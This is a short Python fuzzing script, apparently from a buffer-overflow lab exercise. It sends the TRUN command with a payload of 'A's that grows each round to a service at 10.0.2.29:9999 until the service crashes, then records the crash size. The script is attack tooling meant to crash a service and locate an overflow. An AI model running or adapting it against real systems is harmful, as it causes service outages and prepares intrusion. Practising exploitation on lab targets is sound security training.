#!/usr/bin/python3

import argparse
import socket
from socket import timeout
import signal, sys
from time import sleep

# Args for the command line help
#parser = argparse.ArgumentParser()
#parser.add_argument("-s", help="Remote host to connect")
#parser.add_argument("-p", help="Remote port to connect")
#parser.add_argument("-b", help="Initial size of buffer")
#parser.add_argument("-i", help="Increment of buffer")
#args = parser.parse_args()

#if len(sys.argv) < 2:
#    print(parser.print_help())

def sigint_handler(signal, frame):
    print ("Fuzzing stopped at %s bytes" % str(len(buffer)))
    sys.exit()

signal.signal(signal.SIGINT, sigint_handler)

buffer = "A" * 100

while True:

    try:    
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect(('10.0.2.29',9999))
        payload = "TRUN /.../" + buffer
        s.send((payload.encode()))
        print ("Fuzzing with %s bytes" % str(len(buffer)))
        buffer = buffer + "A"*100
    except timeout:
        print ("Fuzzing crashed at %s bytes" % str(len(buffer)))
        s.close()
        break

    sleep(1)
